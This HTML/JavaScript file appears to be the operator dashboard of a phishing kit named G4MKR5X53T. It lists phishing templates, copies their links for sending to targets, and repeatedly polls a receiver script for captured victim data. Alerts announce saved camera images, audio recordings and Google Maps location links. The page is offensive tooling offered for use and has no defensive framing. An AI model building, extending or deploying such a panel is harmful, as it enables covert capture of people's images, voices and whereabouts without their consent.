<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>G4MKR5X53T</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/css/bootstrap.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');

        body {
            font-family: 'Share Tech Mono', monospace;
            background-color: #0a0a0a;
            color: #00ff00;
            min-height: 100vh;
            transition: margin-left 0.3s ease;
            overflow-x: hidden;
        }

        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                linear-gradient(rgba(0, 255, 0, 0.03) 2px, transparent 2px),
                linear-gradient(90deg, rgba(0, 255, 0, 0.03) 2px, transparent 2px);
            background-size: 50px 50px;
            z-index: -1;
        }

        .sidebar {
            height: 100vh;
            width: 250px;
            position: fixed;
            top: 0;
            left: -250px;
            background: rgba(0, 20, 0, 0.8);
            backdrop-filter: blur(5px);
            padding: 20px;
            transition: 0.3s ease;
            z-index: 1000;
            overflow-y: auto;
            border-right: 1px solid #00ff00;
        }

        .sidebar.active {
            left: 0;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
        }

        .sidebar a {
            display: block;
            color: #00ff00;
            padding: 10px;
            text-decoration: none;
            border-radius: 5px;
            margin-bottom: 10px;
            transition: all 0.3s ease;
            border: 1px solid transparent;
        }

        .sidebar a:hover {
            background-color: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
        }

        .main-content {
            transition: margin-left 0.3s ease;
            padding: 20px;
        }

        .main-content.shifted {
            margin-left: 250px;
        }

        .glass-container {
            background: rgba(0, 20, 0, 0.6);
            border-radius: 8px;
            padding: 20px;
            backdrop-filter: blur(5px);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            width: 90%;
            max-width: 800px;
            margin: 20px auto;
            transition: all 0.3s ease;
        }

        .glass-container:hover {
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
        }

        .template-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            border: 1px solid #00ff00;
            border-radius: 8px;
            background-color: rgba(0, 20, 0, 0.8);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
            transition: all 0.3s ease;
        }

        .template-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }

        .template-image img {
            width: 200px;
            height: auto;
            border-radius: 8px;
            transition: all 0.3s ease;
            border: 1px solid #00ff00;
        }

        .template-image img:hover {
            transform: scale(1.05);
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
        }

        .template-info {
            margin-top: 20px;
            text-align: center;
        }

        .template-path {
            margin-bottom: 15px;
            word-break: break-all;
            font-size: 14px;
            color: #00ff00;
        }

        .btn-copy {
            background-color: transparent;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-copy:hover {
            background-color: rgba(0, 255, 0, 0.1);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }

        .log-controls {
            margin-top: 30px;
        }

        #menu-toggle {
            position: fixed;
            top: 20px;
            left: 20px;
            z-index: 1001;
            background: none;
            border: none;
            color: #00ff00;
            font-size: 24px;
            cursor: pointer;
            transition: 0.3s ease;
        }

        #menu-toggle:hover {
            transform: scale(1.1);
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        #menu-toggle.hidden {
            left: -50px;
        }

        .default-content {
            text-align: center;
            padding: 20px;
        }

        .default-content h1 {
            color: #00ff00;
            margin-bottom: 20px;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        .default-content p {
            margin-bottom: 15px;
        }

        @media (max-width: 768px) {
            .main-content.shifted {
                margin-left: 0;
            }

            .sidebar.active {
                width: 100%;
            }

            .glass-container {
                width: 95%;
            }
        }

        .form-control {
            background-color: rgba(0, 20, 0, 0.8);
            color: #00ff00;
            border-color: #00ff00;
            font-family: 'Share Tech Mono', monospace;
        }

        .form-control:focus {
            background-color: rgba(0, 20, 0, 0.9);
            color: #00ff00;
            border-color: #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.25);
        }

        .btn-outline-success,
        .btn-outline-danger,
        .btn-outline-warning {
            color: #00ff00;
            border-color: #00ff00;
            background-color: transparent;
            transition: all 0.3s ease;
        }

        .btn-outline-success:hover,
        .btn-outline-danger:hover,
        .btn-outline-warning:hover {
            color: #000;
            background-color: #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.4);
        }

        /* Glitch effect */
        .glitch {
            position: relative;
        }

        .glitch::before,
        .glitch::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .glitch::before {
            left: 2px;
            text-shadow: -2px 0 #ff00ff;
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim 5s infinite linear alternate-reverse;
        }

        .glitch::after {
            left: -2px;
            text-shadow: -2px 0 #00ffff;
            clip: rect(44px, 450px, 56px, 0);
            animation: glitch-anim 5s infinite linear alternate-reverse;
        }

        @keyframes glitch-anim {
            0% {
                clip: rect(31px, 9999px, 94px, 0);
            }
            5% {
                clip: rect(70px, 9999px, 71px, 0);
            }
            10% {
                clip: rect(29px, 9999px, 83px, 0);
            }
            /* ... add more keyframes as needed ... */
            100% {
                clip: rect(67px, 9999px, 62px, 0);
            }
        }
    </style>
</head>
<body>
    <button id="menu-toggle">☰</button>
    
    <div class="sidebar">
        <h2 class="glitch" data-text="Operations">Operations</h2>
        <!-- Links will be dynamically loaded here -->
    </div>

    <div class="main-content">
        <div id="content-area" class="glass-container">
            <div class="default-content">
                <h1 class="glitch" data-text="HackNet">G4MKR5X53T</h1>
                <pp>Welcome to the G4MKR5X53T  Next-Gen Social Hacking. </p> <p>  Select an operation from the sidebar to begin.</p>
                <p><strong>Warning:</strong> Unauthorized access is prohibited. Use at your own risk.</p>
                <p><strong>Developed by:</strong> GAMKERS </p>
            </div>
        </div>

        <!-- Log Controls -->
        <div class="log-controls">
            <div class="mt-2 d-flex justify-content-center">
                <textarea class="form-control w-100 m-3" placeholder="Terminal Output" id="result" rows="15"></textarea>
            </div>

            <div class="mt-2 d-flex justify-content-center">
                <button class="btn btn-outline-success m-2" id="btn-listen">Initialize</button>
                <button class="btn btn-outline-warning m-2" id="btn-download">Export Logs</button>
                <button class="btn btn-outline-danger m-2" id="btn-clear">Purge</button>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        $(document).ready(function() {
            // Toggle sidebar
            $("#menu-toggle").click(function() {
                toggleSidebar();
            });

            function toggleSidebar() {
                $(".sidebar").toggleClass("active");
                $(".main-content").toggleClass("shifted");
                $("#menu-toggle").toggleClass("hidden");
            }

            // Load templates into sidebar
            $.post("list_templates.php", function(data) {
                var templates = JSON.parse(data);
                var sidebarLinks = '';

                templates.forEach(template => {
                    sidebarLinks += `
                        <a href="#" onclick="loadTemplate('${template}'); return false;">${template}</a>
                    `;
                });

                $(".sidebar").append(sidebarLinks);
            });

            // Function to load content for a specific template
            window.loadTemplate = function(template) {
                var imageUrl = `${template}.png`;
                var path = `http://${location.host}/templates/${template}/index.html`;

                var content = `
                    <div class="template-item">
                        <div class="template-image">
                            <img src="${imageUrl}" alt="Template Image">
                        </div>
                        <div class="template-info">
                            <p class="template-path">${path}</p>
                            <button class="btn btn-copy" data-path="${path}">Copy</button>
                        </div>
                    </div>
                `;

                $("#content-area").html(content);
                
                // Hide sidebar after selecting a template
                toggleSidebar();
            }

            // Handle Copy Button Click
            $("#content-area").on('click', '.btn-copy', function() {
                var path = $(this).data('path');
                navigator.clipboard.writeText(path).then(() => {
                    Swal.fire({
                        icon: 'success',
                        title: 'The link was copied!',
                        text: path,
                        background: '#111',
                        color: '#00ff00'
                    });
                });
            });

            // Clear Logs Button Click
            $("#btn-clear").on('click', function() {
                $("#result").val('');
            });

            // Download Logs Button Click
            $("#btn-download").on('click', function() {
                var text = $("#result").val();
                var filename = 'log.txt';
                saveTextAsFile(text, filename);
            });

            // Save text as file function
            function saveTextAsFile(text, filename) {
                var blob = new Blob([text], { type: 'text/plain' });
                var url = URL.createObjectURL(blob);
                var a = document.createElement('a');
                a.href = url;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }

            // Listener function and other JS functions
            var old_data = '';

            function Listener() {
                $.post("receiver.php", {"send_me_result": ""}, function(data) {
                    if (data != "") {
                        if (data.includes("Image")) {
                            show_notif("Image File Saved", data.slice(26), true);
                        } else if (data.includes("Audio")) {
                            show_notif("Audio File Saved", data.slice(26), false);
                        } else if (data.includes("Google Map")) {
                            show_notif("Google Map Link", data.slice(18), true);
                        }

                        old_data += data + "\n-------------------------\n";
                        $("#result").val(old_data);
                    }
                });
            }

            function show_notif(msg, path, status) {
                var btn_text = 'Open File';
                var timer = 5000;
                var type_notif = "success";

                if (msg.includes("available")) {
                    btn_text = "Open Link";
                    timer = 0;
                    type_notif = "error";
                } else if (msg.includes("Google Map")) {
                    btn_text = "Open Link";
                    timer = 0;
                }

                console.log('Notification Path:', path); // Log the path for debugging

                Swal.fire({
                    title: msg,
                    text: path,
                    icon: type_notif,
                    showCancelButton: true,
                    confirmButtonText: btn_text,
                    cancelButtonText: 'Cancel',
                    timer: timer,
                    background: '#111',
                    color: '#00ff00'
                }).then((result) => {
                    if (result.isConfirmed) {
                        if (msg.includes("Image File Saved") || msg.includes("Audio File Saved")) {
                            // For local files, use the http:// protocol with the current host
                            var filePath = `http://${location.host}/${path.trim()}`;
                            console.log('Opening file:', filePath);
                            window.open(filePath, '_blank');
                        } else {
                            // For web links
                            var url = path;
                            if (!url.startsWith('http://') && !url.startsWith('https://')) {
                                url = 'http://' + url;
                            }
                            console.log('Opening URL:', url);
                            window.open(url, 'popUpWindow', 'height=640,width=640,left=1000,top=300,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no,status=yes');
                        }
                    }
                });
            }

            var timer = setInterval(Listener, 2000);

            $("#btn-listen").click(function() {
                if ($("#btn-listen").text() == "Press to Stop") {
                    clearInterval(timer);
                    $("#btn-listen").text("Press to Start");
                } else {
                    timer = setInterval(Listener, 2000);
                    $("#btn-listen").text("Press to Stop");
                }
            });
        });
    </script>
</body>
</html>
